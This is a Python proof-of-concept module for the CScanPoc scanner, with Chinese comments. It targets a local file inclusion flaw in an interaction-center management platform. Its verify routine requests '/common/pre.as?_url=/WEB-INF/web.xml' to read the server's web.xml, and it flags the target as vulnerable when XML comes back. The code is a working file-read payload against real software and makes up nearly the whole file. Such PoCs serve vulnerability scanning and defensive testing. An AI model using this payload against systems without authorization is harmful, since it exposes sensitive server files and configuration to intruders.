# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Cncert_0010' # 平台漏洞编号
    name = '互动中心管理平台存在通用型文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-09-17'  # 漏洞公布时间
    desc = '''
        互动中心管理平台存在通用型文件包含包含漏洞，攻击者可以通过构造恶意语句来读取任意文件敏感信息。
    ''' # 漏洞描述
    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=120447
    cnvd_id = 'Uknown' # cnvd漏洞编号
    cve_id = 'Uknown'  # cve编号
    product = 'cncert国家互联网应急中心'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '96a88b47-789f-430e-9149-f1d08946be13' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-12' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/common/pre.as?_url=/WEB-INF/web.xml'
            response = requests.get(vul_url)
            if response.status_code ==200 and 'xml version' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
